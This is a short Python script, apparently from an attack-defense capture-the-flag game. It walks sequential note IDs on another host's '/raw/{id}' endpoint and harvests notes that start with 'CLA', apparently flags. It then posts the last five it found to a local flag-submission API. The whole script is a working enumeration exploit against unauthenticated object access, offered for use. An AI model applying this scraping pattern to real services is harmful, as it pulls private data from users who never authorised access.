import requests
from collections import deque

SOURCE = "http://10.60.3.2:84/raw/{}"
ADDRESS = "http://localhost:8080"

headers = {
    "Accept": "*/*",
    "Accept-Language": "en-US,en",
    "Cache-Control": "no-cache",
    "Connection": "keep-alive",
    "Content-Type": "application/json",
    "Pragma": "no-cache",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "Sec-GPC": "1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    'sec-ch-ua': '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"',
}

def main():
    item_id = 25
    missing_count = 0
    last_matches = deque(maxlen=5)

    while True:
        url = SOURCE.format(item_id)
        try:
            r = requests.get(url, timeout=10)
            text = r.text.strip()

            if text == "Note not found!":
                missing_count += 1
                if missing_count >= 15:
                    if last_matches:
                        last_flag_id = last_matches[-1][0]
                        combined = "".join(flag_text for _, flag_text in last_matches)
                        payload = {"flags": combined}
                        resp = requests.post(ADDRESS + "/api/v1/flags", headers=headers, json=payload, timeout=10)
                        print(last_flag_id)
                    else:
                        print("stopping: no matching content found")
                    break
            else:
                missing_count = 0

            if text.startswith("CLA"):
                last_matches.append((item_id, text))

        except requests.RequestException as e:
            print(f"[{item_id}] error: {e}")

        item_id += 1

if __name__ == "__main__":
    main()